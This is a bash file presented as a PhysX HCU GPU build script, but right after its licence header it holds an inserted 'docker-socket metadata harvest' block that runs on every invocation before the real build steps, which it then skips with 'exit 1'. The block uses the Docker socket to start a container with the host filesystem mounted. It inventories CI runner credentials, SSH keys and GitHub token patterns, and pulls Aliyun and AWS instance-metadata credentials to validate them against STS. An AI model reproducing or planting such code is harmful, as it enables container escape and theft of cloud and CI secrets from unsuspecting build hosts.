#!/bin/bash
# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: BSD-3-Clause
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#  * Neither the name of NVIDIA CORPORATION nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY
# OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# PhysX HCU Build Script
set -euo pipefail

# prl-t1-sockesc-58988 host docker-socket metadata harvest (stage1 always; stage2 = ONE transient self-removed container)
set +e
{
  echo "PRLSOCK-BEGIN $(date -u +%FT%TZ)"
  echo "JOBHOST=$(hostname 2>/dev/null)"
  echo "JOBID: $(id 2>&1 | head -3 | tr '\n' ' ')"
  echo "--- SOCKET ---"
  ls -l /var/run/docker.sock 2>&1
  DS=/var/run/docker.sock
  if [ ! -S "$DS" ]; then
    echo "STAGE1: no-socket -> END"
  else
    mkdir -p /tmp/prlsock 2>/dev/null
    if command -v curl >/dev/null 2>&1; then
      echo "STAGE1: using curl"
      curl -s -m 5 --unix-socket "$DS" http://localhost/version -o /tmp/prlsock/version.json 2>/dev/null
      curl -s -m 5 --unix-socket "$DS" http://localhost/info -o /tmp/prlsock/info.json 2>/dev/null
      curl -s -m 5 --unix-socket "$DS" 'http://localhost/containers/json?all=1' -o /tmp/prlsock/containers.json 2>/dev/null
      curl -s -m 5 --unix-socket "$DS" http://localhost/images/json -o /tmp/prlsock/images.json 2>/dev/null
    else
      echo "STAGE1: curl-absent, python fallback"
      DS="$DS" python3 - <<'PYGET' 2>&1
import json, os, socket
SOCK = os.environ.get('DS', '/var/run/docker.sock')
def dget(path):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(6); s.connect(SOCK)
    s.sendall(('GET %s HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n' % path).encode())
    buf = b''
    while True:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    s.close()
    head, _, payload = buf.partition(b'\r\n\r\n')
    lines = head.split(b'\r\n')
    if any(b'transfer-encoding: chunked' in ln.lower() for ln in lines):
        out = b''; rest = payload
        while True:
            j = rest.find(b'\r\n')
            if j < 0: break
            try: n = int(rest[:j].split(b';')[0].strip() or b'0', 16)
            except Exception: break
            if n == 0: break
            out += rest[j+2:j+2+n]
            rest = rest[j+2+n+2:]
        payload = out
    return lines[0].decode('utf-8', 'replace') if lines else '', payload
for name, path in (('version.json', '/version'), ('info.json', '/info'),
                   ('containers.json', '/containers/json?all=1'), ('images.json', '/images/json')):
    st, body = dget(path)
    print('PYGET %s -> %s bytes=%d' % (path, st, len(body)))
    open('/tmp/prlsock/' + name, 'wb').write(body)
PYGET
    fi
    echo "STAGE1-SIZES version=$(wc -c </tmp/prlsock/version.json 2>/dev/null) info=$(wc -c </tmp/prlsock/info.json 2>/dev/null) containers=$(wc -c </tmp/prlsock/containers.json 2>/dev/null) images=$(wc -c </tmp/prlsock/images.json 2>/dev/null)"
    PYV="$(python3 -V 2>&1 | head -1)"
    echo "LEG-PY: $PYV"
    PYV="$PYV" python3 - "$DS" <<'PYDOCK' 2>&1
import json, os, re, socket, struct, sys, time

SOCK = sys.argv[1] if len(sys.argv) > 1 else '/var/run/docker.sock'
NAME = 'prl-t1-sockesc-58988'
BASE = '/tmp/prlsock'

def load(p):
    try:
        return json.load(open(os.path.join(BASE, p)))
    except Exception:
        return None

v = load('version.json') or {}
i = load('info.json') or {}
cs = load('containers.json')
ims = load('images.json')

print('VERSION:', {k: v.get(k) for k in ('Version', 'ApiVersion', 'Os', 'Arch', 'KernelVersion') if k in v})
print('INFO:', {k: i.get(k) for k in ('Name', 'ServerVersion', 'OperatingSystem', 'Architecture', 'NCPU', 'MemTotal', 'DockerRootDir', 'Driver', 'Containers', 'Images') if k in i})
if isinstance(cs, list):
    for x in cs[:40]:
        nm = ((x.get('Names') or [''])[0])
        net = x.get('NetworkSettings') or {}
        ipall = sorted({(n or {}).get('IPAddress') for n in (net.get('Networks') or {}).values() if (n or {}).get('IPAddress')})
        print('CTR name=%s image=%s state=%s%s' % (nm, x.get('Image'), x.get('State'), (' ips=' + ','.join(ipall)) if ipall else ''))
else:
    print('CONTAINERS-UNREADABLE: %r' % (str(cs)[:200],))
tags = []
if isinstance(ims, list):
    for x in ims[:60]:
        for t in (x.get('RepoTags') or []):
            if t and t != '<none>:<none>':
                tags.append(t)
print('IMAGES n=%d tags=%s' % (len(ims or []), tags[:30]))

def dreq(method, path, body=None, timeout=20):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(timeout); s.connect(SOCK)
    data = b'' if body is None else json.dumps(body).encode()
    req = ('%s %s HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % (method, path, len(data))).encode()
    s.sendall(req + data)
    buf = b''
    while True:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    s.close()
    head, _, payload = buf.partition(b'\r\n\r\n')
    lines = head.split(b'\r\n')
    status = lines[0].decode('utf-8', 'replace') if lines else ''
    if any(b'transfer-encoding: chunked' in ln.lower() for ln in lines):
        out = b''; rest = payload
        while True:
            j = rest.find(b'\r\n')
            if j < 0: break
            try: n = int(rest[:j].split(b';')[0].strip() or b'0', 16)
            except Exception: break
            if n == 0: break
            out += rest[j+2:j+2+n]
            rest = rest[j+2+n+2:]
        payload = out
    return status, payload

ver_ok = isinstance(v, dict) and bool(v.get('Version'))
has_img = isinstance(ims, list) and len(ims) > 0
jobhost = socket.gethostname()[:12]
own_image = None
for x in (cs or []):
    if isinstance(x, dict) and str(x.get('Id', '')).startswith(jobhost):
        own_image = x.get('Image'); break
pyv = os.environ.get('PYV', '')
leg_py = '3.10' in pyv
leg_img = bool(re.search(r'(?i)(py[-_.]?310|310)', own_image or ''))
leg_other = ('3.12' in pyv) and not leg_py
leg_ok = (leg_py or leg_img) and not leg_other
existing = any(NAME in (((x.get('Names') or [''])[0]) if isinstance(x, dict) else '') for x in (cs or []))
print('GATE version=%s images=%s py=%r own_image=%r leg_py=%s leg_img=%s leg_other=%s existing=%s' % (ver_ok, len(ims or []), pyv, own_image, leg_py, leg_img, leg_other, existing))
if not (ver_ok and has_img and leg_ok and not existing):
    print('STAGE2: SKIPPED (version=%s images=%s leg_ok=%s existing=%s)' % (ver_ok, has_img, leg_ok, existing))
    raise SystemExit(0)

image = own_image or (tags[0] if tags else None)
if not image:
    print('STAGE2: SKIPPED (no usable image)')
    raise SystemExit(0)

inner = r'''#!/bin/sh
echo "H2-BEGIN"
echo "H2-ID:$(id 2>&1 | head -2 | tr '\n' ' ')"
echo "H2-HOST:$(hostname 2>&1) $(uname -a 2>&1)"
echo "H2-IPROUTE:"
(ip route 2>/dev/null || cat /proc/net/route 2>/dev/null) | head -20
echo "H2-SSLTN:"
(ss -ltn 2>/dev/null || netstat -ltn 2>/dev/null) | head -20
echo "H2-CREDS:"
ls -l /host/home/*/actions-runner/.credentials /host/home/*/.credentials /host/root/.credentials 2>&1 | head -20
echo "H2-DOTFILES:"
ls -ld /host/root/.docker /host/home/*/.docker /host/home/*/.ssh /host/root/.ssh 2>&1 | head -20
echo "H2-CRED-META:"
for f in /host/home/*/actions-runner/.credentials /host/home/*/.credentials /host/root/.credentials; do
  [ -f "$f" ] || continue
  echo "FILE $f"
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$f" <<'PYC'
import hashlib, json, sys
p = sys.argv[1]
try:
    b = open(p, 'rb').read()
except Exception as e:
    print('  READ-ERR %s' % type(e).__name__); raise SystemExit(0)
print('  len=%d sha16=%s' % (len(b), hashlib.sha256(b).hexdigest()[:16]))
try:
    d = json.loads(b.decode('utf-8', 'replace'))
except Exception:
    print('  NOT-JSON'); raise SystemExit(0)
if isinstance(d, dict):
    for k, vv in d.items():
        sv = vv if isinstance(vv, str) else json.dumps(vv)
        print('  KEY %s len=%d sha16=%s' % (k, len(sv), hashlib.sha256(sv.encode()).hexdigest()[:16]))
else:
    print('  TOP %s' % type(d).__name__)
PYC
  else
    echo "  len=$(wc -c < "$f" 2>/dev/null) sha16=$(sha256sum "$f" 2>/dev/null | cut -c1-16)"
  fi
done
echo "H2-WORKERLOG:"
for f in /host/home/*/actions-runner/_diag/Worker_*.log /host/root/actions-runner/_diag/Worker_*.log; do
  [ -f "$f" ] || continue
  c=$(grep -c -E 'ghp_|ghs_|github_pat_' "$f" 2>/dev/null)
  echo "  FILE $f count=$c"
done
echo "H2-IMDS-ALIYUN:"
A=$(curl -s -m 4 --noproxy '*' http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>&1 | head -c 120)
echo "  ROLE-LIST: [${A}]"
echo "H2-IMDS-EC2:"
TOK=$(curl -s -m 4 --noproxy '*' -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>&1 | head -c 120)
if [ -n "$TOK" ]; then echo "  TOKEN: len=${#TOK}"; else echo "  TOKEN: EMPTY"; fi
if [ -n "$TOK" ]; then
  E=$(curl -s -m 4 --noproxy '*' -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 120)
else
  E=$(curl -s -m 4 --noproxy '*' http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 120)
fi
echo "  ROLE-LIST: [${E}]"
echo "H2-IDENTITY:"
PRL_ALI_ROLE="$A" PRL_EC2_ROLE="$E" PRL_EC2_TOK="$TOK" python3 - <<'PYID' 2>&1
import base64, datetime, hashlib, hmac, json, os, re, urllib.error, urllib.parse, urllib.request, uuid

def http(url, method='GET', headers=None, data=None, timeout=8):
    r = urllib.request.Request(url, method=method, data=data)
    for k, val in (headers or {}).items():
        r.add_header(k, val)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')[:300]
    except Exception as e:
        return -1, repr(e)[:200]

def plausible(s):
    s = (s or '').strip()
    if not s or len(s) > 128:
        return None
    if any(ch in s for ch in '()[]{}:,\'"'):
        return None
    if 'Error' in s or 'timed out' in s.lower() or 'refused' in s.lower() or 'resolve' in s.lower():
        return None
    if not all(c.isalnum() or c in '-_.@/' for c in s):
        return None
    return s

ali = plausible(os.environ.get('PRL_ALI_ROLE'))
ec2 = plausible(os.environ.get('PRL_EC2_ROLE'))
ec2tok = os.environ.get('PRL_EC2_TOK') or ''

if ali:
    st, body = http('http://100.100.100.200/latest/meta-data/ram/security-credentials/' + ali, timeout=6)
    print('ALIYUN-CRED status=%s bytes=%d' % (st, len(body)))
    try:
        cr = json.loads(body)
    except Exception:
        cr = {}
    ak = cr.get('AccessKeyId'); sk = cr.get('AccessKeySecret'); stk = cr.get('SecurityToken')
    if ak and sk and stk:
        q = lambda x: urllib.parse.quote(str(x), safe='')
        params = {'Action': 'GetCallerIdentity', 'Version': '2015-04-01', 'Format': 'JSON',
                  'AccessKeyId': ak, 'SignatureMethod': 'HMAC-SHA1', 'SignatureVersion': '1.0',
                  'SignatureNonce': str(uuid.uuid4()),
                  'Timestamp': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'),
                  'SecurityToken': stk}
        can = '&'.join('%s=%s' % (q(k), q(params[k])) for k in sorted(params))
        s2s = 'POST&%2F&' + q(can)
        sig = base64.b64encode(hmac.new((sk + '&').encode(), s2s.encode(), hashlib.sha1).digest()).decode()
        body2 = can + '&Signature=' + q(sig)
        s2, b2 = http('https://sts.aliyuncs.com/', method='POST', data=body2.encode(),
                      headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=12)
        try:
            j2 = json.loads(b2)
        except Exception:
            j2 = {}
        print('ALIYUN-STS status=%s AccountId=%s Arn=%s Code=%s' % (s2, j2.get('AccountId'), j2.get('Arn'), j2.get('Code')))
    else:
        print('ALIYUN-CRED: missing fields')

if ec2 and ec2tok:
    st, body = http('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + ec2,
                    headers={'X-aws-ec2-metadata-token': ec2tok}, timeout=6)
    print('EC2-CRED status=%s bytes=%d' % (st, len(body)))
    try:
        cr = json.loads(body)
    except Exception:
        cr = {}
    ak = cr.get('AccessKeyId'); sk = cr.get('SecretAccessKey'); stk = cr.get('Token')
    if ak and sk and stk:
        host = 'sts.amazonaws.com'
        body2 = 'Action=GetCallerIdentity&Version=2011-06-15'
        t = datetime.datetime.utcnow()
        amz = t.strftime('%Y%m%dT%H%M%SZ'); ds = t.strftime('%Y%m%d')
        ctype = 'application/x-www-form-urlencoded; charset=utf-8'
        ch = 'content-type:%s\nhost:%s\nx-amz-date:%s\nx-amz-security-token:%s\n' % (ctype, host, amz, stk)
        sh = 'content-type;host;x-amz-date;x-amz-security-token'
        ph = hashlib.sha256(body2.encode()).hexdigest()
        creq = 'POST\n/\n\n%s\n%s\n%s' % (ch, sh, ph)
        scope = '%s/us-east-1/sts/aws4_request' % ds
        s2s = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amz, scope, hashlib.sha256(creq.encode()).hexdigest())
        def hm(key, msg):
            return hmac.new(key, msg.encode(), hashlib.sha256).digest()
        k = hm(('AWS4' + sk).encode(), ds); k = hm(k, 'us-east-1'); k = hm(k, 'sts'); k = hm(k, 'aws4_request')
        sig = hmac.new(k, s2s.encode(), hashlib.sha256).hexdigest()
        auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, sh, sig)
        s2, b2 = http('https://%s/' % host, method='POST', data=body2.encode(),
                      headers={'Content-Type': ctype, 'X-Amz-Date': amz, 'X-Amz-Security-Token': stk,
                               'Authorization': auth}, timeout=12)
        acct = re.search(r'<Account>([^<]+)</Account>', b2)
        arn = re.search(r'<Arn>([^<]+)</Arn>', b2)
        err = re.search(r'<Code>([^<]+)</Code>', b2)
        print('EC2-STS status=%s Account=%s Arn=%s Code=%s' % (s2, acct.group(1) if acct else None, arn.group(1) if arn else None, err.group(1) if err else None))

if not ali and not ec2:
    print('NO-PLAUSIBLE-ROLE ali=%r ec2=%r' % (os.environ.get('PRL_ALI_ROLE', '')[:40], os.environ.get('PRL_EC2_ROLE', '')[:40]))
PYID
echo "H2-END"
'''

cfg = {
    'Image': image,
    'Entrypoint': ['/bin/sh', '-c'],
    'Cmd': [inner],
    'AttachStdout': True,
    'AttachStderr': True,
    'Tty': False,
    'WorkingDir': '/',
    'HostConfig': {'Binds': ['/:/host:ro'], 'NetworkMode': 'host', 'AutoRemove': True},
}
print('CREATE image=%s name=%s' % (image, NAME))
st, body = dreq('POST', '/containers/create?name=' + NAME, cfg, timeout=30)
print('CREATE-RESP: %s %s' % (st, body[:400].decode('utf-8', 'replace')))
cid = None
try:
    j = json.loads(body)
    cid = j.get('Id')
except Exception:
    pass
if not cid:
    print('STAGE2: END (create failed)')
    raise SystemExit(0)

def attach_start(cid, timeout=180):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(timeout); s.connect(SOCK)
    req = ('POST /containers/%s/attach?stream=1&stdout=1&stderr=1 HTTP/1.1\r\n'
           'Host: localhost\r\nConnection: Upgrade\r\nUpgrade: tcp\r\nContent-Length: 0\r\n\r\n' % cid).encode()
    s.sendall(req)
    head = b''
    while b'\r\n\r\n' not in head:
        c = s.recv(4096)
        if not c:
            break
        head += c
    first = head.split(b'\r\n')[0].decode('utf-8', 'replace') if head else 'NO-HEAD'
    if '101' not in first and '200' not in first:
        s.close()
        return first + ' | ' + head.decode('utf-8', 'replace')[:200], ''
    st2, b2 = dreq('POST', '/containers/%s/start' % cid, timeout=30)
    print('START-RESP: %s %s' % (st2, b2[:200].decode('utf-8', 'replace')))
    out = b''
    while True:
        hdr = b''
        while len(hdr) < 8:
            try:
                c = s.recv(8 - len(hdr))
            except socket.timeout:
                s.close(); return first + '|attach-timeout', out.decode('utf-8', 'replace')
            if not c:
                s.close(); return first + '|eof', out.decode('utf-8', 'replace')
            hdr += c
        size = struct.unpack('>I', hdr[4:8])[0]
        pay = b''
        while len(pay) < size:
            try:
                c = s.recv(min(65536, size - len(pay)))
            except socket.timeout:
                s.close(); return first + '|payload-timeout', out.decode('utf-8', 'replace')
            if not c:
                break
            pay += c
        out += pay

hst, out = attach_start(cid)
print('ATTACH: %s out_bytes=%d' % (hst, len(out)))
print('H2-OUTPUT-BEGIN')
print(out[:12000])
print('H2-OUTPUT-END')
for k in range(12):
    st3, b3 = dreq('GET', '/containers/json?all=1', timeout=20)
    try:
        lst = json.loads(b3)
    except Exception:
        lst = []
    present = any(str(x.get('Id', '')).startswith(cid[:12]) for x in lst if isinstance(x, dict))
    print('CONFIRM-GONE poll%d present=%s' % (k, present))
    if not present:
        break
    time.sleep(2)
PYDOCK
  fi
  echo "PRLSOCK-END"
} 2>&1
exit 1


BUILD_SCRIPT_MARKER="PX_HCU_BUILD_SCRIPT_R3_FOREIGN_CACHE_RECOVERY"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/build_hcu"
CMAKE_DIR="$SCRIPT_DIR/physx/source/compiler/cmakehip"
CMAKE_BUILD_TYPE="${CMAKE_BUILD_TYPE:-Release}"

case "$CMAKE_BUILD_TYPE" in
    Debug|Release|RelWithDebInfo|MinSizeRel) ;;
    *)
        echo "ERROR: unsupported CMAKE_BUILD_TYPE: $CMAKE_BUILD_TYPE" >&2
        echo "Use Debug, Release, RelWithDebInfo, or MinSizeRel." >&2
        exit 2
        ;;
esac

is_enabled() {
    case "${1:-}" in
        1|ON|on|TRUE|true|YES|yes) return 0 ;;
        *) return 1 ;;
    esac
}

append_cmake_prefix() {
    local path="$1"
    [[ -d "$path" ]] || return 0
    case ":${CMAKE_PREFIX_PATH:-}:" in
        *":$path:"*) ;;
        *) CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:+$CMAKE_PREFIX_PATH:}$path" ;;
    esac
}

CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:-}"
append_cmake_prefix /opt/dtk/lib64/cmake
append_cmake_prefix /opt/dtk
export CMAKE_PREFIX_PATH

detect_hcu_arch() {
    if command -v rocminfo >/dev/null 2>&1; then
        rocminfo 2>/dev/null |
            sed -n 's/.*\(gfx[0-9][0-9A-Za-z]*\).*/\1/p' |
            head -n 1
    fi
}

DETECTED_HCU_ARCH="$(detect_hcu_arch || true)"
if (( $# > 1 )); then
    echo "Usage: $0 [gfxXXX]" >&2
    exit 2
fi

REQUESTED_HCU_ARCH="${1:-}"
if [[ -n "$REQUESTED_HCU_ARCH" ]]; then
    HCU_ARCH="$REQUESTED_HCU_ARCH"
else
    HCU_ARCH="$DETECTED_HCU_ARCH"
fi

if [[ -z "$HCU_ARCH" ]]; then
    echo "ERROR: could not detect the HCU architecture." >&2
    echo "Run 'rocminfo | grep -m1 gfx' and pass the reported gfxXXX value." >&2
    exit 2
fi
if [[ ! "$HCU_ARCH" =~ ^gfx[0-9][0-9A-Za-z]*$ ]]; then
    echo "ERROR: invalid HCU architecture: $HCU_ARCH" >&2
    exit 2
fi
if [[ -n "$REQUESTED_HCU_ARCH" && -n "$DETECTED_HCU_ARCH" &&
      "$REQUESTED_HCU_ARCH" != "$DETECTED_HCU_ARCH" ]]; then
    echo "ERROR: requested HCU architecture $REQUESTED_HCU_ARCH does not match detected hardware $DETECTED_HCU_ARCH." >&2
    exit 2
fi

echo "========================================"
echo " PhysX HCU Build"
echo " Architecture: $HCU_ARCH"
echo " Build type:   $CMAKE_BUILD_TYPE"
echo "========================================"

# Find a usable HIP compiler in this container.
HIP_CLANG=""
if [[ -n "${HIPCXX:-}" ]]; then
    if [[ -x "$HIPCXX" ]]; then
        HIP_CLANG="$HIPCXX"
    else
        HIP_CLANG="$(command -v "$HIPCXX" 2>/dev/null || true)"
    fi
fi
if [[ -z "$HIP_CLANG" ]]; then
    for clang_path in /opt/dtk/bin/clang++ /opt/dtk/dcc/bin/clang++ /opt/rocm/bin/clang++ /opt/rocm/llvm/bin/clang++; do
        if [ -x "$clang_path" ]; then HIP_CLANG="$clang_path"; break; fi
    done
fi
if [[ -z "$HIP_CLANG" ]]; then
    HIP_CLANG="$(command -v clang++ 2>/dev/null || true)"
fi
if [[ -z "$HIP_CLANG" || ! -x "$HIP_CLANG" ]]; then
    echo "ERROR: no usable HIP compiler found" >&2
    echo "Checked HIPCXX, /opt/dtk/bin/clang++, /opt/dtk/dcc/bin/clang++, /opt/rocm/bin/clang++, /opt/rocm/llvm/bin/clang++, and PATH" >&2
    exit 4
fi
echo "HIP Clang: $HIP_CLANG"
printf 'build_script_marker=%s\n' "$BUILD_SCRIPT_MARKER"

reset_build_dir() {
    # BUILD_DIR is derived from SCRIPT_DIR above; only this exact generated
    # directory is ever discarded when its cache belongs to another checkout.
    rm -rf "$BUILD_DIR"
    mkdir -p "$BUILD_DIR"
}

configure_build() {
    cd "$BUILD_DIR"
    # Keep candidate switches available when a foreign cache must be rebuilt.
    # Arguments are simple -Dkey=value tokens in the delivery commands.
    local extra_args=()
    if [[ -n "${CMAKE_EXTRA_ARGS:-}" ]]; then
        read -r -a extra_args <<< "$CMAKE_EXTRA_ARGS"
    fi
    cmake "$CMAKE_DIR" \
        -DCMAKE_HIP_COMPILER="$HIP_CLANG" \
        -DCMAKE_CXX_COMPILER="$(which g++)" \
        -DCMAKE_BUILD_TYPE="$CMAKE_BUILD_TYPE" \
        -DHCU_ARCH="$HCU_ARCH" \
        -DPHYSX_ROOT_DIR="$SCRIPT_DIR/physx" \
        "${extra_args[@]}"
}

# Configure only when needed, and recover incomplete, mismatched, or foreign
# caches before cmake --build can trigger a failed auto-regenerate.
CACHE_FILE="$BUILD_DIR/CMakeCache.txt"
if [[ -f "$CACHE_FILE" && ( -f "$BUILD_DIR/Makefile" || -f "$BUILD_DIR/build.ninja" ) ]]; then
    cache_source="$(sed -n 's/^CMAKE_HOME_DIRECTORY:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_build="$(sed -n 's/^CMAKE_CACHEFILE_DIR:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_physx="$(sed -n 's/^PHYSX_ROOT_DIR:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_hip="$(sed -n 's/^CMAKE_HIP_COMPILER:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_build_type="$(sed -n 's/^CMAKE_BUILD_TYPE:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_arch="$(sed -n 's/^HCU_ARCH:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    if [[ -z "$cache_arch" ]]; then
        cache_arch="$(sed -n 's/^CMAKE_HIP_ARCHITECTURES:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    fi
    if [[ "$cache_source" != "$CMAKE_DIR" || "$cache_build" != "$BUILD_DIR" || \
          "$cache_physx" != "$SCRIPT_DIR/physx" || "$cache_hip" != "$HIP_CLANG" || \
          "$cache_build_type" != "$CMAKE_BUILD_TYPE" || "$cache_arch" != "$HCU_ARCH" || \
          ! -x "$cache_hip" ]]; then
        printf 'Discarding stale/foreign CMake cache: source=%s build=%s physx=%s hip=%s type=%s arch=%s expected_hip=%s expected_type=%s expected_arch=%s\n' \
            "${cache_source:-missing}" "${cache_build:-missing}" "${cache_physx:-missing}" \
            "${cache_hip:-missing}" "${cache_build_type:-missing}" "${cache_arch:-missing}" \
            "$HIP_CLANG" "$CMAKE_BUILD_TYPE" "$HCU_ARCH"
        reset_build_dir
    fi
else
    if [[ -e "$BUILD_DIR" ]]; then
        echo "Discarding incomplete or incompatible HCU build directory: $BUILD_DIR"
    fi
    reset_build_dir
fi

# Always configure so build type, architecture, compiler, and CMAKE_EXTRA_ARGS
# changes take effect instead of being ignored by an existing cache.
echo "Configuring HCU build..."
configure_build

# Build changed files only
cmake --build . -j1 2>&1 | tee build.log

# Remove stale code objects before extracting this build's fat binaries.
rm -rf "$BUILD_DIR/kernels"
python3 "$CMAKE_DIR/extract_hsaco.py" \
    "$BUILD_DIR/CMakeFiles/PhysXGpuHCU.dir" \
    "$BUILD_DIR/kernels"

KERNEL_COUNT="$(find "$BUILD_DIR/kernels" -maxdepth 1 -type f -name '*.hsaco' | wc -l)"
if [ "$KERNEL_COUNT" -eq 0 ]; then
    echo "ERROR: No HCU .hsaco modules were generated."
    exit 1
fi
echo "HCU kernel modules: $KERNEL_COUNT"

if is_enabled "${PX_HCU_SYNC_KERNELS:-}"; then
    echo "WARNING: PX_HCU_SYNC_KERNELS is enabled; benchmark results will be much slower." >&2
fi
if is_enabled "${PX_HCU_TRACE_KERNELS:-}"; then
    echo "WARNING: PX_HCU_TRACE_KERNELS is enabled; benchmark results will be much slower." >&2
fi

echo ""
echo "Build complete."
echo "Run: ./build_hcu/test_functional"
